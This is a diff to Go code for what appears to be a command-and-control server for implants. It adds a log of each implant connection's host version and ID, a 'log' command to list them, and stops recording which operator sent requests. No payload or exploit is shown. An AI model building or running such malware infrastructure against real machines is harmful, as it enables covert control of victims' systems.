@@ -35,7 +35,10 @@ type CommandQueueItem struct {
     Commands [][]string
     IDMask   int
 }
-
+type ConnectionLog struct {
+    HostVersion string
+    ID          int
+}
 var commandQueue []CommandQueueItem
 
 type Command struct {
@@ -189,7 +192,7 @@ func handleImplant(w http.ResponseWriter, r *http.Request) {
 
 func handleOperator(w http.ResponseWriter, r *http.Request) {
     // Only allow POST requests
-    operatorID := r.Header.Get("Operator-ID")
+    // operatorID := r.Header.Get("Operator-ID")
 
     implantIDStr := r.Header.Get("Implant-ID")
 
@@ -199,8 +202,6 @@ func handleOperator(w http.ResponseWriter, r *http.Request) {
         http.Error(w, "Invalid Implant-ID", http.StatusBadRequest)
         return
     }
-
-    fmt.Println("Received request from operator:", operatorID)
 
     if r.Method != http.MethodPost {
         http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
@@ -294,6 +295,8 @@ func handleServerCMDs(w http.ResponseWriter, r *http.Request) {
             fmt.Println("Invalid command for 'implant' group. Valid command is '-l' for listing implants.")
             fmt.Print(reset)
         }
+    case "log":
+        updateConnections()
     default:
         fmt.Print(red)
         fmt.Println("Invalid command group. Valid command groups are 'shell' and 'implant'.")
@@ -322,6 +325,28 @@ func handleServerCMDs(w http.ResponseWriter, r *http.Request) {
     w.Header().Set("Content-Type", "text/plain")
     w.WriteHeader(http.StatusOK)
     fmt.Fprintf(w, "Data: %s", response)
+}
+
+var vecconnectionlog []ConnectionLog
+
+var prevLength = 0
+func updateConnections() []string {
+    // New connections are added to connectionlog in addToDB()
+    serverresp = nil
+    // If changes were made get the changes
+    if len(vecconnectionlog) != prevLength {
+        // If changes were made, format the log
+        var formattedLog string
+        for _, conn := range vecconnectionlog {
+            formattedLog += fmt.Sprintf("Host Version: %s, ID: %d\n", conn.HostVersion, conn.ID)
+        }
+        // Append the formatted log to serverresp
+
+        serverresp = append(serverresp, formattedLog)
+        prevLength = len(vecconnectionlog)
+        return serverresp
+    }
+    return serverresp // No changes
 }
 
 func listImplants() ([]string, error) {
@@ -550,6 +575,12 @@ func addToDB(uid, versionName string) (int, error) {
     fmt.Println("New Connection")
     fmt.Println("Host Version:", versionName)
     fmt.Println("ID:", IDMask)
+
+    vecconnectionlog = append(vecconnectionlog, ConnectionLog{
+        HostVersion: versionName,
+        ID:          IDMask,
+    })
+
     fmt.Print(reset)
     return IDMask, nil
 }
